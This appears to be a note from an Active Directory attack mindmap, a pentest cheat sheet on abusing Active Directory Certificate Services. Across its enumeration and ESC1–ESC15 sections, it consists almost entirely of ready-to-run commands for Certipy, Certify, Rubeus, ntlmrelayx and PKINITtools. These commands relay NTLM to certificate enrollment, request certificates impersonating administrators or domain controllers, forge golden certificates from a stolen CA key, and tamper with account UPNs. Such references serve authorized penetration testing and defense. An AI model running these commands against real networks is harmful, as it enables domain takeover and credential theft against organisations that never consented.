---
title: "ADCS"
category: adcs
color: "#990099"
tags:
  - ad-mindmap
  - adcs
  - cve
---

# 📜 ADCS

> [!info] Mindmap box `ADCS`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Enumeration
➡️ [[ADCS|Web enrollement]] / [[ADCS|Vulnerable template]] / [[ADCS|Vulnerable CA]] / [[ADCS|Misconfigured ACL]] / [[ADCS|Vulnerable PKI Object AC]]

- `certutil -v -dsTemplate` [↗](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/certutil)
- `certify.exe find [ /vulnerable]` [↗](https://github.com/GhostPack/Certify)
- `certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>` [↗](https://github.com/ly4k/Certipy)
- `ldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templates` [↗](https://github.com/franc-pentest/ldeep)
- Get PKI objects information
    - `certify.exe pkiobjects` [↗](https://github.com/GhostPack/Certify)
- Display CA information
    - `certutil -TCAInfo` [↗](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/certutil)
    - `certify.exe cas` [↗](https://github.com/GhostPack/Certify)

## Web Enrollment Is Up
➡️ [[Domain Admin|Domain admin]]

- ESC8 ➡️ [[Lateral Movement|Pass the ticket]] → [[ACLs & ACEs Permissions|DCSYNC]] / [[Lateral Movement|LDAP shell]]
    - `ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
        - `Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt` [↗](https://github.com/GhostPack/Rubeus)
        - `gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>` [↗](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
    - `certipy relay -target http://<ip_ca>` [↗](https://github.com/ly4k/Certipy)
        - `certipy auth -pfx <certificate> -dc-ip <dc_ip>` [↗](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Template

- ESC1 ➡️ [[Lateral Movement|Pass the certificate]]
    - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name> -upn <target_user>@<domain>` [↗](https://github.com/ly4k/Certipy)
    - `certify.exe request /ca:<server>\<ca-name>   /template:"<vulnerable template name>" [/altname:"Admin"]` [↗](https://github.com/GhostPack/Certify)
- ESC2 ➡️ [[ADCS|ESC3]]
- ESC3
    - `certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>"` [↗](https://github.com/GhostPack/Certify)
        - `certify.exe request request /ca:<server>\<ca-name> /template:<template>  /onbehalfof:<domain>\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]` [↗](https://github.com/GhostPack/Certify)
    - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name>` [↗](https://github.com/ly4k/Certipy)
        - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template  '<vulnerable template name>'  -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>` [↗](https://github.com/ly4k/Certipy)
- ESC13 ➡️ [[Lateral Movement|Pass The Certificate (PKINIT)]]
    - `certipy req -u <user>@<domain> -p <password> -target <ca_server>  -template '<vulnerable template name>' -ca <ca_name>` [↗](https://github.com/ly4k/Certipy)
    - `certify.exe request /ca:<server>\<ca-name> /template:"<vulnerable template name>"` [↗](https://github.com/GhostPack/Certify)
- ESC15
    - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication' #[PR 228]` [↗](https://github.com/ly4k/Certipy) ➡️ [[Lateral Movement|Pass the certificate (only Schannel)]]
    - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent' # [PR 228]` [↗](https://github.com/ly4k/Certipy) ➡️ [[Lateral Movement|Pass the certificate]]
        - `certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>` [↗](https://github.com/ly4k/Certipy)

## Misconfigured ACL

- ESC4
    - write privilege over a certificate template
        - `certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug` [↗](https://github.com/ly4k/Certipy) ➡️ [[ADCS|ESC1]]
        - restore template
            - `certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json` [↗](https://github.com/ly4k/Certipy)
- ESC7
    - Manage CA
        - `certipy ca -ca <ca_name> -add-officer  '<user>' -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>` [↗](https://github.com/ly4k/Certipy) ➡️ [[ADCS|ESC7 Manage certificate]]
    - Manage certificate
        - `certipy ca  -ca <ca_name> -enable-template '<ecs1_vuln_template>' -username <user>@<domain> -password <password>` [↗](https://github.com/ly4k/Certipy)
            - `certipy  req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable template name>' -upn '<target_user>'` [↗](https://github.com/ly4k/Certipy)
                - error, but save private key and get issue request
        - Issue request
            - `certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>` [↗](https://github.com/ly4k/Certipy)
                - `certipy req -u <user>@<domain> -p '<password>'  -ca <ca_name> -retreive <request_id>` [↗](https://github.com/ly4k/Certipy) ➡️ [[Lateral Movement|Pass the certificate]]

## Vulnerable PKI Object access control

- ESC5
    - Vulnerable acl on PKI ➡️ [[ACLs & ACEs Permissions|ACL]]
    - Golden certificate
        - `certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>` [↗](https://github.com/ly4k/Certipy)
            - `certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>` [↗](https://github.com/ly4k/Certipy) ➡️ [[Lateral Movement|Pass the certificate]]

## Misconfigured Certificate Authority

- ESC6 `#CVE` ➡️ [[ADCS|ESC1]]
    - Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication
- ESC11 ➡️ [[Lateral Movement|Pass the ticket]] → [[ACLs & ACEs Permissions|DCSYNC]] → [[Domain Admin|Domain Admin]]
    - `ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
        - `Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt` [↗](https://github.com/GhostPack/Rubeus)
        - `gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>` [↗](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
    - `certipy relay -target rpc://<ip_ca> -ca '<ca_name>'` [↗](https://github.com/ly4k/Certipy)
        - `certipy auth -pfx <certificate> -dc-ip <dc_ip>` [↗](https://github.com/ly4k/Certipy)

## Abuse Certificate Mapping

- ESC9/ESC10 (implicit)
    - `certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>` [↗](https://github.com/ly4k/Certipy)
        - ESC9/ESC10 (Case 1)
            - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator` [↗](https://github.com/ly4k/Certipy) ➡️ [[ADCS|reset accountB UPN]]
                - ESC9
                    - `certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable template>` [↗](https://github.com/ly4k/Certipy)
                - ESC10 (case 1)
                    - `certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any template with client auth>` [↗](https://github.com/ly4k/Certipy)
        - ESC10 (Case 2)
            - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'` [↗](https://github.com/ly4k/Certipy) ➡️ [[ADCS|ESC10  Case1]]
    - reset accountB UPN
        - `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>` [↗](https://github.com/ly4k/Certipy) ➡️ [[Lateral Movement|Pass The Certificate]]
            - [Kerberos Mapping] ESC9/ESC10(Case 1)
            - [Schannel Mapping] ESC9/ESC10 (Case 2)
- ESC14 (explicit)
